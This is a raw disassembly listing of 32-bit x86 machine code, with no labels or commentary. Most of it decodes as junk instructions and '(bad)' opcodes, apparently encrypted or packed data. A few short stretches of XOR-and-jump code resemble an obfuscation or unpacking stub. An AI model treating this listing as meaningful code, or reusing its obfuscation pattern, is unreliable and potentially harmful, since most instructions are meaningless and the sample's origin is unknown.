  4041b2:	sbb    DWORD PTR [edi],esi
  4041b4:	cmp    edi,ebx
  4041b6:	fmul   QWORD PTR [edi-0x4f]
  4041b9:	push   ds
  4041ba:	enter  0xf123,0xb0
  4041be:	loope  0x40414d
  4041c0:	or     DWORD PTR [ebx-0xc67cff1],esi
  4041c6:	enter  0xe9,0x3e
  4041ca:	scas   al,BYTE PTR es:[edi]
  4041cb:	xchg   bh,bl
  4041cd:	mov    esp,0x72a3ecfb
  4041d2:	(bad)  
  4041d3:	adc    DWORD PTR [edx],ebp
  4041d5:	(bad)  
  4041d6:	push   edi
  4041d7:	daa    
  4041d8:	sar    DWORD PTR [ecx-0x35],cl
  4041db:	dec    eax
  4041dc:	cmp    ebp,DWORD PTR [esi+0x8]
  4041df:	add    al,0x65
  4041e1:	mov    ds:0xff958197,al
  4041e6:	mov    ds:0xc6538734,al
  4041eb:	test   DWORD PTR [esi+0xb],edx
  4041ee:	lods   al,BYTE PTR ds:[esi]
  4041ef:	adc    esp,edx
  4041f1:	or     eax,0xcaac416d
  4041f6:	inc    edx
  4041f7:	repnz fadd QWORD PTR [ebx-0x60cb3a77]
  4041fe:	and    BYTE PTR [ebx-0x1911bbe9],ah
  404204:	loopne 0x404273
  404206:	xchg   ebp,eax
  404207:	into   
  404208:	icebp  
  404209:	xor    BYTE PTR [ecx+0x37],al
  40420c:	lock fisubr DWORD PTR [edi-0x61b4e7d7]
  404213:	mov    esp,0x9afbcc3f
  404218:	repz cmc 
  40421a:	add    bh,ah
  40421c:	and    eax,0xa12fcbc0
  404221:	fsub   QWORD PTR ds:[ecx]
  404224:	lea    edi,[ecx+edx*2+0x60f1feca]
  40422b:	ins    BYTE PTR es:[edi],dx
  40422c:	aas    
  40422d:	and    al,0xd
  40422f:	(bad)  
  404230:	jmp    0x404227
  404232:	fadd   QWORD PTR [eax+0x4f]
  404235:	sbb    edi,ecx
  404237:	mov    al,BYTE PTR [ecx]
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	setg   BYTE PTR ds:0x184fed9d
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0x3170707d
  404265:	add    al,0x40
  404267:	pop    ds
  404268:	stos   DWORD PTR es:[edi],eax
  404269:	ja     0x404278
  40426b:	(bad)  
  40426c:	pop    edx
  40426d:	dec    edi
  40426e:	xchg   esp,eax
  40426f:	cmc    
  404270:	test   BYTE PTR [edi-0x48],dh
  404273:	or     DWORD PTR [ebx+ebx*2],edi
  404276:	aam    0xe9
  404278:	dec    esp
  404279:	sbb    ebp,edx
  40427b:	cdq    
  40427c:	(bad)  
  40427d:	jno    0x404237
  40427f:	and    eax,0x3eeebcaf
  404284:	mov    WORD PTR [ecx+0x1d],?
  404287:	mov    eax,ds:0x69200843
  40428c:	lea    eax,[edi+0x3]
  40428f:	or     edx,ebx
  404291:	in     eax,0x5
  404293:	mov    al,ds:0x5941275a
  404298:	fist   DWORD PTR [edx-0xe]
  40429b:	fs iret 
  40429d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429e:	inc    ecx
  40429f:	sar    BYTE PTR [edx+0x5a],cl
  4042a2:	add    DWORD PTR [ebx+0x4571af51],ebp
  4042a8:	jle    0x4042f7
  4042aa:	and    al,0xc3
  4042ac:	arpl   WORD PTR [edx],si
  4042ae:	mov    BYTE PTR [eax+0x30a07d5b],bl
  4042b4:	popa   
  4042b5:	sub    eax,ebp
  4042b7:	sar    esp,0xd
  4042ba:	dec    eax
  4042bb:	pcmpgtb mm4,QWORD PTR [eax-0xe]
  4042bf:	lods   al,BYTE PTR ds:[esi]
  4042c0:	scas   al,BYTE PTR es:[edi]
  4042c1:	call   0x64ea:0xc1608be9
  4042c8:	mov    BYTE PTR [edi-0x6a],cl
  4042cb:	push   0x617fd7e7
  4042d0:	stc    
  4042d1:	xchg   ecx,eax
  4042d2:	cmp    BYTE PTR [ebp-0x3a],0x61
  4042d6:	rol    esi,cl
  4042d8:	mov    ?,WORD PTR [esi-0x3]
  4042db:	or     bh,BYTE PTR [eax]
  4042dd:	mov    edi,0x47929749
  4042e2:	test   DWORD PTR [ebx],ebp
  4042e4:	sub    bl,BYTE PTR [ecx+0x1d]
  4042e7:	sub    DWORD PTR [edx+0x71],esp
  4042ea:	dec    edx
  4042ec:	push   eax
  4042ed:	cdq    
  4042ee:	inc    esi
  4042ef:	(bad)  
  4042f1:	sub    ch,BYTE PTR [edx+esi*4+0x56]
  4042f5:	repnz mov ds:0x2d2e9dd9,al
  4042fb:	stos   DWORD PTR es:[edi],eax
  4042fc:	sar    BYTE PTR [esi+0x674b394],1
  404302:	fmul   st(4),st
  404304:	(bad)  
  404305:	test   eax,0xc3eb6cb
  40430a:	mov    ecx,0xfe47c492
  40430f:	outs   dx,DWORD PTR ds:[esi]
  404310:	arpl   WORD PTR [ebx-0x48231a60],si
  404316:	data16 fcmovu st,st(7)
  404319:	push   0x15e037ec
  40431e:	mov    esi,0xac7d7e51
  404323:	adc    al,0x97
  404325:	addr16 sbb al,0x74
  404328:	in     eax,0x4b
  40432a:	js     0x4042cc
  40432c:	hlt    
  40432d:	and    dl,BYTE PTR [edx-0x4b71e75e]
  404333:	out    dx,eax
  404334:	aam    0x38
  404336:	mov    ecx,?
  404338:	mov    ds:0xfc0230b4,al
  40433d:	mov    ss,edi
  40433f:	and    ah,BYTE PTR [ebp+ebx*2-0xf]
  404343:	or     esp,DWORD PTR [eax+0x419e1400]
  404349:	lods   al,BYTE PTR ds:[esi]
  40434a:	or     BYTE PTR [edi+0x1abbe14f],ah
  404350:	(bad)  
  404351:	jmp    0xa61e:0xcb4b5616
  404358:	xchg   esi,eax
  404359:	jp     0x40436b
  40435b:	xchg   DWORD PTR ds:[ebx-0x30],esp
  40435f:	cmp    al,0x13
  404361:	iret   
  404362:	fisttp DWORD PTR ds:0xefc85c72
  404368:	fimul  WORD PTR [ebx-0x39]
  40436b:	arpl   WORD PTR [ebx+edx*4-0x290a0794],sp
  404372:	test   eax,0xe662f686
  404377:	mov    edi,ebp
  404379:	add    eax,0x404ae51c
  40437e:	xchg   BYTE PTR [ebx-0x34],dh
  404381:	push   ecx
  404382:	push   ecx
  404383:	ja     0x4043d2
  404385:	sbb    ebx,DWORD PTR ds:0x24d4ad2d
  40438b:	sbb    edi,DWORD PTR [ebp+0x3b8929fc]
  404391:	mov    bh,0xb6
  404393:	cdq    
  404394:	aas    
  404395:	mov    esi,0x459214e9
  40439a:	psubd  mm1,QWORD PTR [eax+ecx*8-0x76]
  40439f:	int3   
  4043a0:	iretw  
  4043a2:	fcom   DWORD PTR [esi+0x12f43eb0]
  4043a8:	xchg   DWORD PTR [ecx-0x19],edi
  4043ab:	aad    0xb7
  4043ad:	fdivrp st(5),st
  4043af:	sbb    cl,BYTE PTR [edx-0x3245cd2b]
  4043b5:	outs   dx,BYTE PTR ds:[esi]
  4043b6:	xor    ah,BYTE PTR [esi]
  4043b8:	nop
  4043b9:	cli    
  4043ba:	inc    ebx
  4043bb:	lock shl dl,1
  4043be:	popa   
  4043bf:	push   ds
  4043c0:	imul   edx,DWORD PTR [esi-0x536b1434],0x9c3c8e98
  4043ca:	pushf  
  4043cb:	ss pop eax
  4043cd:	scas   eax,DWORD PTR es:[edi]
  4043ce:	xchg   ebp,eax
  4043cf:	aaa    
  4043d0:	test   al,0x7c
  4043d2:	fnsave [eax+eax*8-0x21447536]
  4043d9:	cmp    ah,BYTE PTR [ecx-0x39c5d5a3]
  4043df:	or     esi,eax
  4043e1:	sub    WORD PTR [ecx-0x4f],0xb83b
  4043e7:	xchg   DWORD PTR [esp+eiz*4-0x5],eax
  4043eb:	fisub  DWORD PTR ds:0x84b827c8
  4043f1:	mov    edx,0x10e47606
  4043f6:	mov    eax,ds:0xf29bb16d
  4043fb:	add    al,BYTE PTR [eax]
  4043fd:	xchg   esp,eax
  4043fe:	mov    dl,0x94
  404400:	pop    es
  404401:	cli    
  404402:	aad    0xcb
  404404:	jge    0x404407
  404406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404407:	dec    esi
  404408:	and    DWORD PTR [edi+0x709a2908],ebp
  40440e:	loopne 0x40439c
  404410:	into   
  404411:	push   ecx
  404412:	xor    eax,0x852e8761
  404417:	adc    BYTE PTR [esp+ebp*4+0x41],cl
  40441b:	add    BYTE PTR [esi],al
  40441d:	mov    edx,0xd025fede
  404422:	in     eax,0x19
  404424:	dec    esp
  404425:	pop    ebp
  404426:	in     al,0x47
  404428:	ret    0xeddf
  40442b:	pop    ebp
  40442c:	adc    BYTE PTR [eax-0x450a418f],dh
  404432:	pop    ds
  404433:	jmp    0x6e606afa
  404438:	jo     0x4043dd
  40443a:	call   0x4250:0x60778064
  404441:	pop    ss
  404442:	xor    al,0x41
  404444:	fild   DWORD PTR [esi-0x73e7347d]
  40444a:	vpmullw ymm3,ymm1,ymm3
  40444e:	fstp   DWORD PTR [ecx+0x75]
  404451:	pop    eax
  404452:	aam    0x72
  404454:	fyl2x  
  404456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404457:	shr    esi,1
  404459:	pusha  
  40445a:	in     al,0x88
  40445c:	imul   edx,DWORD PTR [ebp-0x24],0x8ff07563
  404463:	mov    esp,0xfc17e5c
  404468:	es sbb bh,cl
  40446b:	cmp    eax,0xb77a2ca
  404470:	jne    0x4044d8
  404472:	dec    eax
  404473:	sti    
  404474:	mov    ebp,0xdef1492a
  404479:	jno    0x4044b3
  40447b:	rol    DWORD PTR [ebp+0x2d],cl
  40447e:	adc    edx,eax
  404480:	lds    esp,FWORD PTR [ebp-0x73]
  404483:	jp     0x4044e9
  404485:	fucomip st,st(4)
  404487:	dec    ebx
  404488:	jge    0x4044fb
  40448a:	mov    al,ds:0x61053e9b
  40448f:	fiadd  WORD PTR [eax-0x80]
  404492:	cwde   
  404493:	sub    edx,DWORD PTR [esi-0xc197863]
  404499:	mov    al,ds:0x52c41e13
  40449e:	push   eax
  40449f:	ins    DWORD PTR es:[edi],dx
  4044a0:	inc    eax
  4044a1:	jno    0x4044d8
  4044a3:	mov    ds:0x563fff85,eax
  4044a8:	aas    
  4044a9:	and    ecx,ecx
  4044ab:	jmp    0xdb445f64
  4044b0:	fwait
  4044b1:	stos   BYTE PTR es:[edi],al
  4044b2:	sbb    ah,BYTE PTR [ebp-0x126d80f9]
  4044b8:	js     0x404513
  4044ba:	cmp    edx,DWORD PTR [esi]
  4044bc:	mov    ebp,0x5b62fb9
  4044c1:	repnz (bad) 
  4044c3:	or     ebx,DWORD PTR [esi-0x2e]
  4044c6:	sbb    al,0xe0
  4044c8:	push   0xffffff97
  4044ca:	(bad)  
  4044cc:	xchg   BYTE PTR [ebp-0x2d],bh
  4044cf:	loop   0x4044b3
  4044d1:	sbb    esi,edi
  4044d3:	xor    dh,BYTE PTR [ecx+0x78]
  4044d6:	and    al,0xa5
  4044d8:	into   
  4044d9:	lahf   
  4044da:	push   ds
  4044db:	sar    BYTE PTR [eax+0x1578c613],0xfb
  4044e2:	outs   dx,DWORD PTR ds:[esi]
  4044e3:	cld    
  4044e4:	jnp    0x40447b
  4044e6:	sub    eax,0x9bce0d17
  4044eb:	or     DWORD PTR [edx],edx
  4044ed:	pop    ds
  4044ee:	xor    DWORD PTR [ebp-0x59],ebx
  4044f1:	imul   eax,DWORD PTR [edi-0x71c6b3c3],0xffffffa9
  4044f8:	iret   
  4044f9:	(bad)  
  4044fa:	bound  eax,QWORD PTR [eax+0x61]
  4044fd:	ins    DWORD PTR es:[edi],dx
  4044fe:	jge    0x404501
  404500:	cmp    ebp,ebx
  404502:	addr16 push edx
  404504:	push   esp
  404505:	out    dx,eax
  404506:	mov    ebp,0x5e4eafd0
  40450b:	popf   
  40450c:	jp     0x404551
  40450e:	shl    BYTE PTR [eax],cl
  404510:	hlt    
  404511:	mov    esp,0xd9c74132
  404516:	fs cmp eax,0x481f077
  40451c:	jle    0x404559
  40451e:	call   0x918c6cda
  404523:	idiv   BYTE PTR [ebx+eiz*2]
  404526:	call   0xe79c:0x14525c23
  40452d:	sub    al,0xd3
  40452f:	jne    0x4044d9
  404531:	add    eax,0xc8833b05
  404536:	inc    esp
  404537:	loope  0x404532
  404539:	sub    al,0x5e
  40453b:	sub    dh,0x3b
  40453e:	adc    eax,0x819a82e4
  404543:	or     BYTE PTR [esi+0x1b],bl
  404546:	xchg   esp,eax
  404547:	and    eax,0xc67df290
  40454c:	shl    DWORD PTR [ebp+edi*2+0x349764b6],0xa5
  404554:	lods   eax,DWORD PTR fs:[esi]
  404556:	sti    
  404557:	dec    ebp
  404558:	dec    ebx
  404559:	push   esi
  40455a:	mov    ebx,0x64e50a1a
  40455f:	arpl   WORD PTR [ebx-0x7f],dx
  404562:	jmp    0x699:0xcdb8ecb9
  404569:	jge    0x40454e
  40456b:	ins    DWORD PTR es:[edi],dx
  40456c:	add    esi,esi
  40456e:	fmul   DWORD PTR [eax+0x7]
  404571:	pushf  
  404572:	pop    edi
  404573:	mov    eax,0x82b0cfb1
  404578:	add    eax,0x32eecd4d
  40457d:	jl     0x404545
  40457f:	and    eax,0xb07bb9a9
  404584:	ins    BYTE PTR es:[edi],dx
  404585:	nop
  404586:	or     eax,0xb7e50d6d
  40458b:	js     0x404577
  40458d:	mov    esp,0xe2303288
  404592:	in     eax,dx
  404593:	mul    edi
  404595:	push   cs
  404596:	push   edx
  404597:	mov    ecx,0x37d786d1
  40459c:	adc    al,0x2b
  40459e:	mov    ebx,0x98801908
  4045a3:	lahf   
  4045a4:	xor    al,BYTE PTR [edi+0x11820fe2]
  4045aa:	stc    
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	daa    
  4045c8:	inc    ax
  4045ca:	jns    0x4045d8
  4045cc:	and    al,0x70
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x40461e
  4045d4:	fdivr  DWORD PTR [esi-0x53b71c9a]
  4045da:	xlat   BYTE PTR ds:[ebx]
  4045db:	test   BYTE PTR [ecx],ch
  4045dd:	mov    ds:0x50a67a07,eax
  4045e2:	mov    ah,0x21
  4045e4:	push   cs
  4045e5:	stos   BYTE PTR es:[edi],al
  4045e6:	repz xor bh,cl
  4045e9:	in     eax,0x3a
  4045eb:	sbb    bl,BYTE PTR [edx]
  4045ed:	out    dx,eax
  4045ee:	cdq    
  4045ef:	rcr    BYTE PTR [ebp-0x26d16332],0x66
  4045f6:	xor    BYTE PTR [ebp+ebp*8+0x20],ch
  4045fa:	in     eax,dx
  4045fb:	ins    DWORD PTR es:[edi],dx
  4045fc:	mov    edi,0x974315f6
  404601:	push   ecx
  404602:	imul   ebx,DWORD PTR [eax+0x18],0x69
  404606:	mov    al,0x73
  404608:	pop    ebp
  404609:	or     BYTE PTR [edi+0x17],al
  40460c:	and    eax,0xbfc6d7df
  404611:	in     al,0x80
  404613:	addr16 call 0xf554:0xfeb44d11
  40461b:	jnp    0x404634
  40461d:	xor    ch,cl
  40461f:	xor    BYTE PTR [ecx-0x36],bh
  404622:	enter  0x6905,0x2c
  404626:	and    al,0x65
  404628:	jmp    0xd0eaa182
  40462d:	xchg   ecx,eax
  40462e:	outs   dx,BYTE PTR ds:[esi]
  40462f:	inc    eax
  404630:	outs   dx,BYTE PTR ds:[esi]
  404631:	or     ch,0x40
  404634:	jno    0x4045ba
  404636:	into   
  404637:	cmp    BYTE PTR [eax+0x2e],dh
  40463a:	rcr    BYTE PTR [esi+0x39],cl
  40463d:	scas   eax,DWORD PTR es:[edi]
  40463e:	stos   DWORD PTR es:[edi],eax
  40463f:	(bad)  
  404640:	mov    edx,0xedeb17c9
  404645:	xlat   BYTE PTR ds:[ebx]
  404646:	sbb    DWORD PTR [eax+ecx*4],edx
  404649:	sub    BYTE PTR [ebp+0x11],al
  40464c:	stos   DWORD PTR es:[edi],eax
  40464d:	inc    ebx
  40464e:	push   0x13
  404650:	iret   
  404651:	sub    BYTE PTR [esi],bl
  404653:	jmp    0x404662
  404655:	out    dx,eax
  404656:	fistp  QWORD PTR [ebx+0xa]
  404659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40465a:	and    BYTE PTR [ebp+0x2e],cl
  40465d:	xor    edx,ebp
  40465f:	pop    ebp
  404660:	popf   
  404661:	and    esp,DWORD PTR [edi+ecx*4-0x6c]
  404665:	shl    BYTE PTR [esi],0x22
  404668:	call   DWORD PTR [ecx-0x5ae6a4b]
  40466e:	jo     0x4046c0
  404670:	iret   
  404671:	push   ebp
  404672:	pop    esp
  404673:	aad    0x11
  404675:	and    eax,0x150370b5
  40467a:	out    dx,al
  40467b:	or     DWORD PTR [eax],0x79ea847
  404681:	adc    dh,BYTE PTR [ebp+0x61]
  404684:	(bad)  
  404685:	retf   
  404686:	jae    0x4046a6
  404688:	inc    ecx
  404689:	jno    0x4046e1
  40468b:	sbb    eax,0xe57e965f
  404690:	xchg   ebx,eax
  404691:	xchg   edi,eax
  404692:	les    eax,FWORD PTR [eax+0x5e5f3eae]
  404698:	mov    edi,0xd68399c9
  40469d:	je     0x4046ae
  40469f:	mov    ecx,0x1696efde
  4046a4:	jns    0x404629
  4046a6:	cmp    al,0x97
  4046a8:	(bad)  
  4046aa:	cmp    al,0x90
  4046ac:	xchg   cl,ah
  4046ae:	mov    eax,0x4190ae29
  4046b3:	xor    esi,DWORD PTR [edx-0x6]
  4046b6:	int    0x1b
  4046b8:	iret   
  4046b9:	arpl   WORD PTR [edi+0x67215d6c],bp
  4046bf:	xchg   BYTE PTR [ebp-0x30dba8ef],bh
  4046c5:	mov    edx,0x3cb13ccc
  4046ca:	push   ss
  4046cb:	test   eax,0xa0edbcf6
  4046d0:	sub    esi,DWORD PTR [ecx+0xdd04615]
  4046d6:	pop    esp
  4046d7:	jbe    0x4046fa
  4046d9:	adc    bl,al
  4046db:	ins    BYTE PTR es:[edi],dx
  4046dc:	lds    edi,FWORD PTR [eax-0x2d7df16]
  4046e2:	movlps xmm5,QWORD PTR [ecx]
  4046e5:	pop    edx
  4046e6:	loop   0x404748
  4046e8:	hlt    
  4046e9:	(bad)  [ebp-0x70a6c714]
  4046ef:	jb     0x4046b9
  4046f1:	pusha  
  4046f2:	dec    esp
  4046f3:	shl    ebx,1
  4046f5:	mov    bh,0xfb
  4046f7:	scas   al,BYTE PTR es:[edi]
  4046f8:	test   esi,ebx
  4046fa:	in     al,dx
  4046fb:	std    
  4046fc:	ds mov ebx,0xd797f1ac
  404702:	imul   ecx,DWORD PTR [ebx],0xffffffbe
  404705:	shr    bh,1
  404707:	fwait
  404708:	push   ds
  404709:	retf   
  40470a:	ret    
  40470b:	cmp    DWORD PTR [edx],0x46f7b50
  404711:	jl     0x40478b
  404713:	adc    esp,eax
  404715:	mov    esp,0x3267dfac
  40471a:	bound  ebx,QWORD PTR [esi+0x36]
  40471d:	jnp    0x40470f
  40471f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404720:	adc    DWORD PTR [edi-0x56],esp
  404723:	push   esp
  404724:	sbb    al,0x5
  404726:	cmp    BYTE PTR [esi+0x671d223a],ch
  40472c:	dec    edx
  40472d:	retf   0xc8bd
  404730:	cmp    BYTE PTR [esi+0x38147d6d],ah
  404736:	sar    ecx,1
  404738:	clc    
  404739:	in     al,dx
  40473a:	mov    WORD PTR [edx+0x77],ss
  40473d:	fldenv [esi]
  40473f:	sbb    eax,DWORD PTR [ebx]
  404741:	jecxz  0x40477e
  404743:	(bad)  
  404744:	jecxz  0x404797
  404746:	call   0xf0556bba
  40474b:	fnstcw WORD PTR [ebx]
  40474d:	jle    0x4047a8
  40474f:	sbb    edx,0xffffffc8
  404752:	cmp    DWORD PTR [edi+0x1de8d2ba],ebp
  404758:	dec    eax
  404759:	xchg   BYTE PTR [edi+0x6b2252e8],ch
  40475f:	jl     0x404756
  404761:	mov    cl,0xae
  404763:	push   eax
  404764:	xchg   ebp,eax
  404765:	hlt    
  404766:	mov    ch,0xd7
  404768:	inc    edi
  404769:	dec    edi
  40476a:	fistp  DWORD PTR [ebp-0x78c3cfe2]
  404770:	test   eax,0xc939a107
  404775:	icebp  
  404776:	cmp    al,BYTE PTR [edx-0x48]
  404779:	pop    esp
  40477a:	stos   BYTE PTR es:[edi],al
  40477b:	push   esi
  40477c:	arpl   WORD PTR [eax*8+0x3303726f],dx
  404783:	mov    ebp,0x4fbd3f72
  404788:	adc    esp,esp
  40478a:	rol    ch,1
  40478c:	xchg   DWORD PTR [esi+0x28],esi
  40478f:	cdq    
  404790:	retf   
  404791:	jle    0x404730
  404793:	pop    esp
  404794:	pop    es
  404795:	mul    BYTE PTR [esi-0x251c91a0]
  40479b:	sbb    DWORD PTR [ebp-0x4876360b],edx
  4047a1:	pushf  
  4047a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047a3:	inc    edi
  4047a4:	clc    
  4047a5:	pop    ebp
  4047a6:	imul   ecx,esp,0x64
  4047a9:	or     al,0x5c
  4047ab:	lods   eax,DWORD PTR ds:[esi]
  4047ac:	inc    edx
  4047ad:	std    
  4047ae:	ins    BYTE PTR es:[edi],dx
  4047af:	and    al,dh
  4047b1:	mov    eax,ds:0xbc70ee06
  4047b6:	adc    al,0x45
  4047b8:	add    DWORD PTR [ebx],ecx
  4047ba:	jp     0x404771
  4047bc:	inc    ebx
  4047bd:	sub    ecx,DWORD PTR [edi-0x7dfaba95]
  4047c3:	pop    ds
  4047c4:	icebp  
  4047c5:	push   edi
  4047c6:	fidiv  WORD PTR [ebp-0x63]
  4047c9:	push   ecx
  4047ca:	or     dh,cl
  4047cc:	push   0xea5254aa
  4047d1:	jnp    0x404829
  4047d3:	mov    BYTE PTR ds:0x11d7ff4c,al
  4047d9:	mov    esi,0x7cf7b9e2
  4047de:	imul   esp,edi,0x6e
  4047e1:	dec    ebp
  4047e2:	gs sbb eax,0x23ed62f5
  4047e8:	sub    eax,0x56f32b2c
  4047ed:	or     edi,DWORD PTR [esi+0x79bd801f]
  4047f3:	mov    WORD PTR [eax+0x2b1c3b5e],?
  4047f9:	imul   BYTE PTR [esi+0x36]
  4047fc:	ds sbb eax,0x71f097f8
  404802:	js     0x4047fc
  404804:	out    0x3b,al
  404806:	in     al,0x3d
  404808:	out    0x55,al
  40480a:	lods   ax,WORD PTR ds:[esi]
  40480c:	test   al,0xbb
  40480e:	out    dx,eax
  40480f:	lock push 0x7e
  404812:	mov    edx,0x2df6d74d
  404817:	jnp    0x40486d
  404819:	pop    ebp
  40481a:	stos   BYTE PTR es:[edi],al
  40481b:	push   es
  40481c:	adc    eax,0xe30f87a1
  404821:	mov    WORD PTR [esi],cs
  404823:	ret    
  404824:	pop    ebx
  404825:	js     0x404881
  404827:	fild   DWORD PTR [ebp-0x45cbabaa]
  40482d:	es loopne 0x4047bb
  404830:	jns    0x4047d6
  404832:	mov    ds:0xd1258bb7,al
  404837:	sbb    al,0x30
  404839:	jmp    0x40483f
  40483b:	add    al,0x70
  40483d:	xor    dh,BYTE PTR [edi]
  40483f:	aam    0x37
  404841:	pushf  
  404842:	dec    edx
  404843:	hlt    
  404844:	das    
  404845:	je     0x404811
  404847:	dec    ebx
  404848:	inc    eax
  404849:	xor    eax,0x713bb95a
  40484e:	mov    bl,0xbc
  404850:	mov    bh,0x70
  404852:	sub    ebx,eax
  404854:	push   cs
  404855:	in     al,dx
  404856:	leave  
  404857:	mov    bl,0x2b
  404859:	fisttp QWORD PTR ds:0x58bc4e2
  40485f:	push   cs
  404860:	pusha  
  404861:	lock fiadd WORD PTR [ecx-0x70]
  404865:	push   esp
  404866:	sbb    DWORD PTR [eax],eax
  404868:	iret   
  404869:	jb     0x404899
  40486b:	and    dl,BYTE PTR [esi+0x47]
  40486e:	sub    BYTE PTR [ebp+0x6ea9f9d8],bl
  404874:	inc    eax
  404875:	pop    ebx
  404876:	mov    edx,0x525bc595
  40487b:	cld    
  40487c:	(bad)  
  40487d:	jno    0x404885
  40487f:	shl    BYTE PTR [esi],0x85
  404882:	jp     0x40481d
  404884:	jp     0x4048b6
  404886:	mov    cl,BYTE PTR [edi-0x2e]
  404889:	xchg   edx,eax
  40488a:	dec    edi
  40488b:	popf   
  40488c:	stc    
  40488d:	mov    eax,0x364164ff
  404892:	mov    ch,0x65
  404894:	mov    edi,0xa4e47067
  404899:	fiadd  DWORD PTR [edx-0x7d]
  40489c:	adc    BYTE PTR [ecx+0x308423c4],dl
  4048a2:	ins    DWORD PTR es:[edi],dx
  4048a3:	ret    
  4048a4:	push   esp
  4048a5:	push   esp
  4048a6:	cmc    
  4048a7:	add    al,0x3d
  4048a9:	call   0xe8a:0x43d90efb
  4048b0:	xor    BYTE PTR [ebx+0x74],0xc2
  4048b4:	xor    bh,BYTE PTR ds:0xd3d640ba
  4048ba:	mov    ebx,0x201f054
  4048bf:	cmp    BYTE PTR [ecx+edx*4],dh
  4048c2:	fmul   DWORD PTR ds:[ebp-0x58]
  4048c6:	lock cmp ch,ch
  4048c9:	aas    
  4048ca:	stos   BYTE PTR es:[edi],al
  4048cb:	push   eax
  4048cc:	dec    ecx
  4048cd:	jae    0x404917
  4048cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048d0:	or     bl,dh
  4048d2:	out    0xa3,eax
  4048d4:	xor    dh,BYTE PTR [eax-0x65]
  4048d7:	inc    BYTE PTR [eax+0xa592847]
  4048dd:	pop    ebx
  4048de:	jle    0x404898
  4048e0:	mov    bl,0xcf
  4048e2:	inc    esi
  4048e3:	jecxz  0x404881
  4048e5:	sar    ch,cl
  4048e7:	cmp    BYTE PTR [ecx+ecx*1],cl
  4048ea:	xor    dl,BYTE PTR [eax+0x39]
  4048ed:	cmp    DWORD PTR [ebx-0xd],0xfffffff6
  4048f1:	nop
  4048f2:	imul   ebp,DWORD PTR [esi+0x62],0x4f
  4048f6:	(bad)
  4048fa:	iret   
  4048fb:	(bad)  
  4048fc:	mov    al,ds:0x2d9557b0
  404901:	or     DWORD PTR [ecx+0x42],esp
  404904:	mov    BYTE PTR [ebx+0x63],al
  404907:	mov    ecx,ebp
  404909:	lds    esp,FWORD PTR [edi]
  40490b:	mov    es,WORD PTR [ebp-0x5e]
  40490e:	jmp    0xa071df6a
  404913:	hlt    
  404914:	or     al,0x79
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	dec    ebx
  4049bc:	popf   
  4049bd:	(bad)  [ecx-0x37]
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0xcc70707d
  4049c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c9:	mov    WORD PTR [esi-0x18984268],es
  4049cf:	es int 0xc3
  4049d2:	outs   dx,DWORD PTR ds:[esi]
  4049d3:	xor    DWORD PTR [ebx*1-0xdb3b3d5],edi
  4049da:	xchg   DWORD PTR [esi],ecx
  4049dc:	push   ds
  4049dd:	push   es
  4049de:	lods   al,BYTE PTR ds:[esi]
  4049df:	mov    DWORD PTR [esi-0x33],ebp
  4049e2:	and    esp,DWORD PTR [edi]
  4049e4:	faddp  st(5),st
  4049e6:	call   0x8f32122d
  4049eb:	jne    0x404a12
  4049ed:	rcl    DWORD PTR [ecx+0xe2ebb57],cl
  4049f3:	jne    0x404a45
  4049f5:	cmp    ebp,esi
  4049f7:	int    0xe7
  4049f9:	mov    ebp,0x2f28c9ad
  4049fe:	jnp    0x4049f9
  404a00:	ins    DWORD PTR es:[edi],dx
  404a01:	loope  0x4049e4
  404a03:	lea    ecx,[edx-0x6b5621dc]
